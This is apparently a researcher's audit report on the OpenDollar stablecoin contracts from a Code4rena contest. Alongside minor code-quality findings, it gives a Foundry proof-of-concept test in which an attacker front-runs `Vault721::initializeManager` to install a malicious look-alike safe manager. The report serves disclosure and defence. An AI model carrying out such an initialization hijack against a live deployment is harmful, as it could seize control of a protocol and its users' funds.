# OpenDollar
OpenDollar contest || Stablecoin || 18 Oct 2023 to 25 Nov 2023 on [code4rena](https://code4rena.com/audits/2023-10-open-dollar#top)

## My Findings Summary

|ID|Title|Severity|
|:-:|-----|:------:|
|[L-01](#l-01-initialization-of-safemanger-contract-in-vault721-contract-is-allowed-to-anyone-and-it-can-be-initialized-by-a-malicious-contract-by-an-mev)|Initialization of `SafeManger` contract in `Vault721` contract is allowed to anyone, and it can be initialized by a Malicious contract by an MEV|LOW|
|[L-02](#l-02-payable-function-with-delegatecall-traps-ether-in-odproxyexecute)|Payable Function with Delegatecall Traps Ether in `ODProxy::execute`|LOW|
||||
|[NC&#8209;01](#nc-01-reused-code-in-camelotrelayersol-and-univ3relayersol-can-be-refactored-in-a-single-function)|Reused code in `CamelotRelayer.sol` and `UniV3Relayer.sol` can be refactored in a single function|INFO|
|[NC-02](#nc-02-reused-code-in-odsafemanagersol-can-be-refactored-in-a-single-function)|Reused code in `ODSafeManager.sol` can be refactored in a single function|INFO|
|[NC-03](#nc-03-unused-parameter-in-vault721_aftertokentransfer-function)|Unused parameter in `Vault721::_afterTokenTransfer` function|INFO|

---

## [L-01] Initialization of `SafeManger` contract in `Vault721` contract is allowed to anyone, and it can be initialized by a Malicious contract by an MEV

### Summary
`SafeManger` contract can only be initialized once, then it can only be changed through the governance. So it may get initialized by a Malicious contract by MEV.

### Impact
Anyone can initialize the `safeManager` address in `Vault721`, but once initialized it can only be changed through governance.

The problem is that the function doesn't revert, so the deploying process will not revert if this attack occurs.

```solidity
// Vault721::initializeManager
// @audit [M: Anyone can initialize first]
function initializeManager() external {
    if (address(safeManager) == address(0)) _setSafeManager(msg.sender);
}
```

The code is open source, and it is in a public context, so some bad people may see the code, so they may try to do this attack. and it will let them have control over the system.

For example: they can initialize it to a contract exactly as the SafeManger contract, with the same functions, but with some functions to steal funds.

Hackers can track all team wallets used in testing, and deploying into testnets. and if the team used one of these wallets to deploy to mainnet, this attack could occur.

If the team decided to distribute governance tokens before deploying, then changing it may be kind of hard. In addition to the waste of money used in wrong deploying.

NOTE: This can be made to `Vault721::initializeRenderer` also, but it's not a problem, since it just previews the NFT as an image.

### Proof of Concept
I made a file `test/Attack.t.sol` to simulate the attack scenario, here is the scenario that can occur when deploying the code to mainnet.

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.19;

import {Test, console} from "forge-std/Test.sol";
import "@script/Contracts.s.sol";

contract Attack is Contracts, Test {
    address public Attacker = makeAddr("attacker");

    function testAttacking() public {
        // An Attacker is tracking all OpenDollar team wallets TXs...
        safeEngine = new SAFEEngine(
            ISAFEEngine.SAFEEngineParams({
                safeDebtCeiling: 2_000_000 * (10 ** 18), // 2M COINs (WAD)
                globalDebtCeiling: 25_000_000 * (10 ** 45) // 25M COINs (RAD)
            })
        );

        // oracleRelayer = new OracleRelayer(address(safeEngine), systemCoinOracle, _oracleRelayerParams);
        // [rest of deployments before deploying `vault721`]

        // The Attacker (MEV) Get that the vault contract is deployed
        vault721 = new Vault721(address(odGovernor));

        // The Attacker will set safeManager address before list of deployments
        vm.startPrank(Attacker);
        AttackContract fakeSafeManager = new AttackContract(
            address(safeEngine),
            address(vault721)
        );
        fakeSafeManager.attack(address(vault721));
        vm.stopPrank();
        // ------------

        safeManager = new ODSafeManager(address(safeEngine), address(vault721));
        // nftRenderer = new NFTRenderer(address(vault721), address(oracleRelayer), address(taxCollector), address(collateralJoinFactory));
        // [rest of deploying after deploying `vault721`]

        console.log(
            "Real SafeManager Address:",
            address(vault721.safeManager())
        ); // 0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a
        console.log("Expected SafeManager Address:", address(safeManager)); // 0xF62849F9A0B5Bf2913b396098F7c7019b51A820a

        assertEq(address(vault721.safeManager()), address(fakeSafeManager)); // 0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a

        // An attack occurs successfully, and no error occurs but the contract is set to a Malicious contract

        // No one can initialize it since it's already initialized, it must be changed through the governance
        vault721.initializeManager();

        assertEq(address(vault721.safeManager()), address(fakeSafeManager)); // 0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a
    }
}

/// @dev This contract can implement all `ODSafeManger` functions, but with a function to crack the system.
contract AttackContract is ODSafeManager {
    constructor(
        address _safeEngine,
        address _vault721
    ) ODSafeManager(_safeEngine, _vault721) {}

    function attack(address target) public {
        (bool success, bytes memory res) = target.call(
            abi.encodeWithSignature("initializeManager()")
        );
    }

    // function stealFunds() public {
    //    ...
    // }
}
```

### Tools Used
Manual Review

### Recommended Mitigation Steps
- The team should use a different wallet in deploying to mainnet, and not use wallets used in testing.
- The team should check that the SafeManager address is initialized correctly after completing the deployment process.
- If the team wants to distribute governance tokens in ICO, they can wait till they are sure the system is working well, then distribute tokens.

Just one of these approaches should solve the problem, but it's better to keep all solutions in mind.

---

## [L-02] Payable Function with Delegatecall Traps Ether in `ODProxy::execute`

### Impact
the execute function in the `ODProxy` contract has a payable modifier, which implies that it can receive Ether. However, the function utilizes delegatecall to execute code in another contract (Action contracts like `BasicAction`), which does not forward the Ether sent to the execute function. As a result, any Ether sent to this function becomes trapped within the contract.

```solidity
// ODProxy::execute
// @audit [M: payable function with no handled ETH]
function execute(
    address _target,
    bytes memory _data
) external payable onlyOwner returns (bytes memory _response) {
    if (_target == address(0)) revert TargetAddressRequired();

    bool _succeeded;
    (_succeeded, _response) = _target.delegatecall(_data);

    if (!_succeeded) {
        revert TargetCallFailed(_response);
    }
}
```

### Tools Used
Manual Review

### Recommended Mitigation Steps
Since The protocol doesn't depend on the native ETH coin, the payable modifier should be removed from the execute function in the `ODProxy` contract.

---
---
---

## [NC-01] Reused code in `CamelotRelayer.sol` and `UniV3Relayer.sol` can be refactored in a single function

In `CamelotRelayer.sol` contract, function `read()` and function `getResultWithValidity()` have the same code to get the quoteAmount, so we can make a function `getQuoteAmount()` for example, and use it in both of them.

- **contracts/oracles/CamelotRelayer.sol**
  - [#L74-L81](https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/CamelotRelayer.sol#L74-L81)
  - [#L93-L99](https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/CamelotRelayer.sol#L93-L99)

The same refactor can be made in `UniV3Relayer.sol` contract, as it implements the same logic of `CamelotRelayer.sol`

- **contracts/oracles/UniV3Relayer.sol**
  - [#L80-L87](https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/UniV3Relayer.sol#L80-L87)
  - [#L99-L105](https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/UniV3Relayer.sol#L99-L105)


### [NC-02] Reused code in `ODSafeManager.sol` can be refactored in a single function

In `ODSafeManager.sol` contract, functions `quitSystem` and `enterSystem` have the same code to get the deltaCollateral and deltaDebt values. so we can make a function `getSafeDeltaInfo()` for example, and use it in both of them.

- **contracts/proxies/ODSafeManager.sol**
  - [#L190-L193](https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/proxies/ODSafeManager.sol#L190-L193)
  - [#L206-L209](https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/proxies/ODSafeManager.sol#L206-L209)


### [NC-03] Unused parameter in `Vault721::_afterTokenTransfer` function

The fourth parameter which is `batchSize` is not used in the `Vailt721` contract, but it must be set since the function has this parameter in `ERC721` contract. It is better to not path the parameter and just add the type instead, like this.

```solidity
// Vault721::_afterTokenTransfer
function _afterTokenTransfer(
    address from,
    address to,
    uint256 firstTokenId,
    uint256 /*batchSize*/ // @audit [removing the unused parameter]
) 
```
 
- **contracts/proxies/Vault721.sol**
  - [#L187](https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/proxies/Vault721.sol#L187)







